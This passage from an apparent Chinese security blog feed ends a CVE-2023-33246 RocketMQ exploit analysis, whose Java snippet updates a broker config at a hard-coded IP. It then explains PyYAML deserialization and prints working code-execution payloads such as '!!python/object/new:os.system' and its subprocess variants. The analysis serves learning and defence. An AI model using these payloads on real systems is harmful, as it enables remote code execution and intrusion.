class-name">DefaultMQAdminExt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        admin<span class="token punctuation">.</span><span class="token function">setNamesrvAddr</span><span class="token punctuation">(</span><span class="token string">"124.222.21.138:9876"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        admin<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 更新配置⽂件</span>        admin<span class="token punctuation">.</span><span class="token function">updateBrokerConfig</span><span class="token punctuation">(</span><span class="token string">"124.222.21.138:10911"</span><span class="token punctuation">,</span> props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Properties</span> brokerConfig <span class="token operator">=</span> admin<span class="token punctuation">.</span><span class="token function">getBrokerConfig</span><span class="token punctuation">(</span><span class="token string">"124.222.21.138:10911"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>brokerConfig<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"rocketmqHome"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>brokerConfig<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"filterServerNums"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 关闭 DefaultMQAdminExt 对象</span>        admin<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="关于-RocketMQ-协议发包"><a href="#关于-RocketMQ-协议发包" class="headerlink" title="关于 RocketMQ 协议发包"></a>关于 RocketMQ 协议发包</h3><p>这里我用 tcpdump 抓包了，但是我还是没有特别明白，这到底是什么意思，意思是强制更新吗还是。。</p><p>通过抓包其实可以看出来也是同样的过程。这里我觉得发包其实就是做了一个强制更新的操作，从上面的漏洞分析过程可以看到，<code>sh xxx</code> 一系列的参数，在被执行时是陆陆续续的，所以我们可以通过发包来强制更新</p><img src="/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wiresharkHTTP.png" class=""><p>后续知道其实这是需要 TCP 发包构造</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这个洞其实找到链尾就不难了</p><p>CVE-2023-33246 的命令执行方式还是挺骚的，同时我在向淚笑大师傅请教的过程中学到了非常多的东西，首先是漏洞挖掘这一块，需要多元思考，其实这个尾部命令执行的点还是挺有意思的，说不定其他很多产品也会存在这个问题。</p><p>再就是多用 docker，他搭建环境非常非常快。</p><p>最后就是如何挖洞，是要多关注官方文档的很多的功能利用的，多调试。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;发一篇库存&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Python yaml 反序列化</title>
    <link href="https://drun1baby.github.io/2023/06/02/Python-yaml-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://drun1baby.github.io/2023/06/02/Python-yaml-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2023-06-02T08:29:18.000Z</published>
    <updated>2023-06-02T08:38:33.621Z</updated>
    
    <content type="html"><![CDATA[<p>Python yaml 反序列化</p><span id="more"></span><h1 id="Py-Yaml-反序列化漏洞"><a href="#Py-Yaml-反序列化漏洞" class="headerlink" title="Py Yaml 反序列化漏洞"></a>Py Yaml 反序列化漏洞</h1><h2 id="Python-中的强制类型转换"><a href="#Python-中的强制类型转换" class="headerlink" title="Python 中的强制类型转换"></a>Python 中的强制类型转换</h2><ul><li>Py Yaml 的漏洞本质上是因为这一点产生的</li></ul><p>可以通过 <code>!!</code> 来进行类型转换。</p><p>通过上面的测试可以发现，如果识别到一个数字，那么按照 YAML 格式来处理，这个类型就是数字类型。如果我们想把数字类型变为字符串类型就可以这样：<code>a: !!str 1</code>，它的结果和 <code>a: &quot;1&quot;</code> 是一样的。</p><p>由于 YAML 仅仅是一种格式规范，所以理论上一个支持 YAML 的解析器可以选择性支持 YAML 的某些语法，也可以在 YAML 的基础上利用 <code>!!</code> 来扩展额外的解析能力。本文主要聚焦于 PyYAML，所以直接看源码就可以知道它在 <code>!!</code> 上做了哪些魔改。</p><p>在 <code>site-packages/yaml/constructor.py</code> 中可以看到使用了 <code>add_constructor</code> 的有 24 多个地方，这些都是用来支持基础的类型转换（带有 <code>tag:yaml.org,2002:python/</code> 的说明是 PyYAML 自定义的类型转换）</p><p>这些基础类型转换的功能非常好理解，看上面那张图即可，就不多说了，我们下面简单写一个 demo</p><p><strong>test.py</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># test.yaml 文件内容  </span><span class="token comment"># str: !!str 3.14     把浮点型3.14强转成str类型  </span><span class="token comment"># int: !!int "123"    把字符串123强转成int类型  </span>  <span class="token comment"># python 代码  </span><span class="token keyword">import</span> yaml  <span class="token keyword">import</span> os    <span class="token comment"># 项目路径  </span>project_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>split<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>realpath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'tools'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>      <span class="token keyword">def</span> <span class="token function">get_yaml_data</span><span class="token punctuation">(</span>fileDir<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token triple-quoted-string string">"""     读取 test.yaml 文件内容     :param fileDir:   :return:     """</span>   <span class="token comment"># 1、在内存里加载这个文件  </span>   f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>fileDir<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>     <span class="token comment"># 2、调用yaml读取文件  </span>   res <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>     <span class="token keyword">return</span> res      <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>     info <span class="token operator">=</span> get_yaml_data<span class="token punctuation">(</span>project_path <span class="token operator">+</span> <span class="token string">r'\test.yaml'</span><span class="token punctuation">)</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Run test.py</p><p>我们可以调试代码，简单看一下流程与一些值，传入的参数 node 格式为</p><p>所以对于一个 <code>!!x x</code> 来说，类型转换执行的伪代码就是：<code>find_function(&quot;x&quot;)(x)</code>。这个也很好理解。</p><h3 id="高级类型转换"><a href="#高级类型转换" class="headerlink" title="高级类型转换"></a>高级类型转换</h3><p>在理解了基础的类型转换之后，查看源码可以发现还有一个 <code>add_multi_constructor</code> 函数，一共有 5 个：</p><ul><li><code>python/name</code></li><li><code>python/module</code></li><li><code>python/object</code></li><li><code>python/object/new</code></li><li><code>python/object/apply</code></li></ul><p>从上面那张图可以看到，这几个都可以引入新的模块。这就是 PyYAML 存在反序列化的本质原因。</p><ul><li>用 Pycharm 来安装两个 Py Yaml 版本，先从 Py Yaml &lt; 5.1 的版本说起</li></ul><h2 id="PyYaml-lt-5-1-的序列化与反序列化"><a href="#PyYaml-lt-5-1-的序列化与反序列化" class="headerlink" title="PyYaml &lt; 5.1 的序列化与反序列化"></a>PyYaml &lt; 5.1 的序列化与反序列化</h2><p>在 Python 中的 PyYAML 库中提供这几种方式实现 Python 和 Yaml 这两种语言的转换。</p><p><strong>yaml -&gt; python</strong> 使用的方法是 <code>yaml.dump</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">yaml<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>dump()</code> 方法将 Python 对象 <code>data</code> 转换为 YAML 格式的方法，<code>data</code> 是一个 Python 对象，可以是字典、列表、元组、整数、浮点数、字符串、布尔值等基本数据类型，也可以是自定义的类的实例。</p><p>举个例子：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>      <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'John'</span><span class="token punctuation">,</span>      <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token number">30</span><span class="token punctuation">,</span>      <span class="token string">'is_student'</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span>      <span class="token string">'hobbies'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'reading'</span><span class="token punctuation">,</span> <span class="token string">'swimming'</span><span class="token punctuation">,</span> <span class="token string">'traveling'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token string">'address'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>          <span class="token string">'street'</span><span class="token punctuation">:</span> <span class="token string">'123 Main St'</span><span class="token punctuation">,</span>          <span class="token string">'city'</span><span class="token punctuation">:</span> <span class="token string">'Anytown'</span><span class="token punctuation">,</span>          <span class="token string">'state'</span><span class="token punctuation">:</span> <span class="token string">'CA'</span><span class="token punctuation">,</span>          <span class="token string">'zip'</span><span class="token punctuation">:</span> <span class="token string">'12345'</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>    yaml_data <span class="token operator">=</span> yaml<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>yaml_data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果：</p><p>在这个代码中，我们定义了一个 Python 字典 <code>data</code>，然后使用 <code>yaml.dump</code> 方法将 <code>data</code> 对象转换为 YAML 格式，并将其赋值给变量 <code>yaml_data</code>。最后，我们打印 <code>yaml_data</code>，输出转换后的 YAML 格式数据。</p><p>其实通俗点来说，就是将 Python 的对象实例转化为 YAML 格式的字符串，也就是<strong>序列化</strong>。</p><h3 id="深入挖掘-Py-YAML-序列化与反序列化"><a href="#深入挖掘-Py-YAML-序列化与反序列化" class="headerlink" title="深入挖掘 Py YAML 序列化与反序列化"></a>深入挖掘 Py YAML 序列化与反序列化</h3><ul><li>其实 Py YAML 并不是只有一个 <code>yaml.load()</code> 一个反序列化的方法</li></ul><p>&lt;5.1 版本中提供了几个方法用于解析 YAML：</p><ol><li><code>yaml.load</code>：加载单个 YAML 配置</li><li><code>yaml.load_all</code>：加载多个 YAML 配置</li></ol><p>以上这两种均可以通过 <code>Loader</code> 参数来指定加载器。一共有三个加载器，加载器后面对应了三个不同的构造器：</p><ol><li><code>BaseConstructor</code>：最最基础的构造器，不支持强制类型转换</li><li><code>SafeConstructor</code>：集成 BaseConstructor，强制类型转换和 YAML 规范保持一致，没有魔改</li><li><code>Constructor</code>：在 YAML 规范上新增了很多强制类型转换</li></ol><p><code>Constructor</code> 这个是最危险的构造器，却是默认使用的构造器。</p><p>所有的 <code>construct_python_xxx()</code> 所有方法都调用了 <code>constructor()</code> 方法，这让我想起来 CVE-2018-1284 这个洞，大致上差不多。</p><p>我们可以先用这个 EXP 调试看一下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml    poc <span class="token operator">=</span> <span class="token string">'!!python/object/new:os.system ["calc.exe"]'</span>  <span class="token comment">#给出一些相同用法的POC  </span><span class="token comment">#poc = '!!python/object/new:subprocess.check_output [["calc.exe"]]'  </span><span class="token comment">#poc = '!!python/object/new:os.popen ["calc.exe"]'  </span><span class="token comment">#poc = '!!python/object/new:subprocess.run ["calc.exe"]'  </span><span class="token comment">#poc = '!!python/object/new:subprocess.call ["calc.exe"]'  </span><span class="token comment">#poc = '!!python/object/new:subprocess.Popen ["calc.exe"]'  </span>  yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>到 <code>make_python_instance()</code> 的调用栈如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">make_python_instance<span class="token punctuation">,</span> constructor<span class="token punctuation">.</span>py<span class="token punctuation">:</span><span class="token number">552</span>construct_python_object_apply<span class="token punctuation">,</span> constructor<span class="token punctuation">.</span>py<span class="token punctuation">:</span><span class="token number">606</span>construct_python_object_new<span class="token punctuation">,</span> constructor<span class="token punctuation">.</span>py<span class="token punctuation">:</span><span class="token number">617</span>construct_object<span class="token punctuation">,</span> constructor<span class="token punctuation">.</span>py<span class="token punctuation">:</span><span class="token number">88</span>construct_document<span class="token punctuation">,</span> constructor<span class="token punctuation">.</span>py<span class="token punctuation">:</span><span class="token number">41</span>get_single_data<span class="token punctuation">,</span> constructor<span class="token punctuation">.</span>py<span class="token punctuation">:</span><span class="token number">37</span>load<span class="token punctuation">,</span> __init__<span class="token punctuation">.</span>py<span class="token punctuation">:</span><span class="token number">72</span><span class="token operator">&lt;</span>module<span class="token operator">></span><span class="token punctuation">,</span> EXP<span class="token punctuation">.</span>py<span class="token punctuation">:</span><span class="token number">11</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>中间的调用栈也很简单，这里不再赘述，直接看漏洞触发点，其实是从 <code>find_python_name()</code> 方法中开始被调用</p><p>跟进 <code>find_python_name()</code> 方法，里面触发点是在 <code>__import__</code> 上，在 SSTI 里面我们就会用到 <code>__import__</code> 来导入恶意类，从而实现漏洞攻击。</p><p>利用成功</p><p><strong>针对!!python&#x2F;module标签</strong></p><p>这个标签对应的是源码中的 <code>construct_python_module</code>，针对这个标签的利用方法和前两个不同，它没有调用逻辑，但是再搭配任意文件上传有奇效。</p><p>首先写入执行目录，yaml 中指定同名模块，例如上传一段恶意代码，叫 <code>exp.py</code>，然后通过 <code>yaml.load(&#39;!!python/module:exp&#39;)</code> 加载。</p><p>在实际的场景中，由于一般用于存放上传文件的目录和执行目录并不是同一个，例如：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">app<span class="token punctuation">.</span>py  uploads  <span class="token operator">|</span>_ user<span class="token punctuation">.</span>png  <span class="token operator">|</span>_ header<span class="token punctuation">.</span>jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这个时候只需要上传一个 .py 文件，这个文件会被放在 uploads 下，这时只需要触发 <code>import uploads.header</code> 就可以利用了：</p><p>接着运行 <code>python3 app.py</code> 即可</p><h2 id="PyYaml-gt-x3D-5-1-的序列化与反序列化"><a href="#PyYaml-gt-x3D-5-1-的序列化与反序列化" class="headerlink" title="PyYaml &gt;&#x3D; 5.1 的序列化与反序列化"></a>PyYaml &gt;&#x3D; 5.1 的序列化与反序列化</h2><p>大部分东西是一样的，区别在于 PyYaml &gt;&#x3D; 5.1 的时候，它并不是以 <code>Constructor</code> 作为默认使用的构造器。所以我们在请求的时候，是需要加上 <code>Loader</code> 这个参数的</p><p>这里说明一下 PyYaml &gt;&#x3D; 5.1 都有哪些加载器</p><pre class="line-numbers language-none"><code class="language-none">BaseLoader：不支持强制类型转换SafeLoader：安全地加载 YAML 格式的数据，限制被加载的 YAML 数据中可用的 Python 对象类型，从而防止执行危险的操作或代码。FullLoader：加载包含任意 Python 对象的 YAML 数据，FullLoader 加载器不会限制被加载的 YAML 数据中可用的 Python 对象类型，因此可以加载包含任意 Python 对象的 YAML 数据。UnsafeLoader：加载包含任意 Python 对象的 YAML 数据，并且不会对被加载的 YAML 数据中可用的 Python 对象类型进行任何限制。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>从加载器里面就可以比较明显得看出来，如果要进行漏洞挖掘的话，一定是从下面三个加载器去做文章，其中第二个 <code>SafeLoader</code> 需要我们去找 bypass 的方法，而剩下两个，则是寻找能利用的方法。</li></ul><p>在 PyYaml &gt;&#x3D; 5.1的版本之后，Fullloader 这个加载器对于 payload 的限制比较多了，我们延用PyYaml 的 poc 还是可以的，只不过要修改一下。</p><p>我们还可以利用 python 内置的 builtins 模块(因为之前我们审计 constructor.py 时，发现定义的find_python_name() 中，如果不用”.”将模块名和对象名分开，会默认调用 builtins 模块)</p><h4 id="1-沿用-PyYaml-lt-x3D-5-1-的-poc"><a href="#1-沿用-PyYaml-lt-x3D-5-1-的-poc" class="headerlink" title="1.沿用 PyYaml&lt;&#x3D;5.1 的 poc"></a>1.沿用 PyYaml&lt;&#x3D;5.1 的 poc</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> yaml <span class="token keyword">import</span> <span class="token operator">*</span>poc<span class="token operator">=</span> <span class="token triple-quoted-string string">b"""!!python/object/apply:os.system- calc"""</span><span class="token comment">#subprocess.check_output</span><span class="token comment">#os.popen</span><span class="token comment">#subprocess.run</span><span class="token comment">#subprocess.call</span><span class="token comment">#subprocess.Popen</span>yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>poc<span class="token punctuation">,</span>Loader<span class="token operator">=</span>Loader<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-利用-builtins-模块中的内置函数"><a href="#2-利用-builtins-模块中的内置函数" class="headerlink" title="2.利用 builtins 模块中的内置函数"></a>2.利用 builtins 模块中的内置函数</h4><p>首先，我们先明确 builtins 中的所有的类，从而筛选出可以利用的类</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> builtinsbuiltin_classes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> obj_name <span class="token keyword">in</span> <span class="token builtin">dir</span><span class="token punctuation">(</span>builtins<span class="token punctuation">)</span><span class="token punctuation">:</span>    obj <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>builtins<span class="token punctuation">,</span> obj_name<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        builtin_classes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>builtin_classes<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ArithmeticError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'AssertionError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'AttributeError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'BaseException'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'BaseExceptionGroup'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'BlockingIOError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'BrokenPipeError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'BufferError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'BytesWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ChildProcessError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ConnectionAbortedError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ConnectionError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ConnectionRefusedError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ConnectionResetError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'DeprecationWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'EOFError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'EncodingWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'OSError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'Exception'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ExceptionGroup'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'FileExistsError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'FileNotFoundError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'FloatingPointError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'FutureWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'GeneratorExit'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'OSError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ImportError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ImportWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'IndentationError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'IndexError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'InterruptedError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'IsADirectoryError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'KeyError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'KeyboardInterrupt'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'LookupError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'MemoryError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ModuleNotFoundError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'NameError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'NotADirectoryError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'NotImplementedError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'OSError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'OverflowError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'PendingDeprecationWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'PermissionError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ProcessLookupError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'RecursionError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ReferenceError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ResourceWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'RuntimeError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'RuntimeWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'StopAsyncIteration'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'StopIteration'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'SyntaxError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'SyntaxWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'SystemError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'SystemExit'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'TabError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'TimeoutError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'TypeError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UnboundLocalError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UnicodeDecodeError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UnicodeEncodeError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UnicodeError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UnicodeTranslateError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UnicodeWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UserWarning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ValueError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'Warning'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'OSError'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token 